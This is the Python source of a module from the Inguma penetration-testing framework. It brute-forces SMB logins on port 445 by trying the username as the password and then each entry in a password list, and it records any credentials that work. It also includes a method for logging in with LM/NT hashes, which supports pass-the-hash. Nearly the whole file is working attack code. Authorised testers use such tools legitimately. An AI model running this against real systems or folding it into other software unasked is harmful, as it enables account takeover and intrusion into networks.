#!/usr/bin/python

"""
Smb brute force module for Inguma
Copyright (c) 2007 Joxean Koret <joxeankoret@yahoo.es>

License is GPL v2
"""

import os
import sys
import time
import string
from impacket import smb

from lib.libexploit import CIngumaModule

name = "brutesmb"
brief_description = "A simple SMB brute force tool"
type = "gather"

class CSmbBrute(CIngumaModule):

	target = ""
	waitTime = 0
	timeout = 1
	exploitType = 3
	services = ""
	results = {}
	user = ""

	def __init__(self):
		self.smb = None
		self.tid = None
		self.pwd = ''
		self.share = None

	def help(self):
		print "target = <target host or network>"
		print "user = <username>"

	def bruteForce(self):
		userList = [self.user, ]
		self.open(self.target, "445")

		try:
			self.gom.echo( "Trying " + self.user + "/" + self.user )
			self.login(self.user, self.user)
			self.addToDict(self.target + "_passwords", self.user + "/" + self.user)
			self.results[self.user] = self.user
			return True
		except:
			# Well, first try :)
			pass

		for user in userList:
			for passwd in self.getPasswordList():
				time.sleep(self.waitTime)
				try:
					passwd = passwd.replace("\n", "").replace("\r", "")
					self.gom.echo( "Trying " + user + "/" + passwd + "..." )
					self.login(user, passwd)
					sys.stdout.write("\b"  * 80)
					self.addToDict(self.target + "_passwords", self.user + "/" + passwd)
					self.results[user] = passwd

					return True
				except KeyboardInterrupt:
					self.gom.echo( "Aborted." )
					return False
				except:
					pass

		return False

	def run(self):
		if self.target == "":
			self.gom.echo( "No target specified" )
			return False
		
		if self.user == "":
			self.gom.echo( "No user specified" )
			return False

		self.bruteForce()
		return True

	def printSummary(self):
		self.gom.echo( "" )
		for x in self.results:
			self.gom.echo( "[+] User guessed: " + x + "/" + self.results[x] )

	def open(self,host,port):
		self.smb = smb.SMB("*SMBSERVER", host, port)

	def login(self,username, password):
		if not self.smb:
			self.gom.echo( "Open a connection first." )

		self.smb.login(username, password)

	def login_hash(self,username, lmhash, nthash):
		if not self.smb:
			self.gom.echo( "Open a connection first." )

		self.smb.login(username, '', lmhash=lmhash, nthash=nthash)

	def logoff(self):
		if not self.smb:
			self.gom.echo( "Open a connection first." )

		self.smb.logoff()
		self.smb = None

	def close(self):
		if not self.smb:
			self.gom.echo( "Open a connection first." )

		self.smb.close();
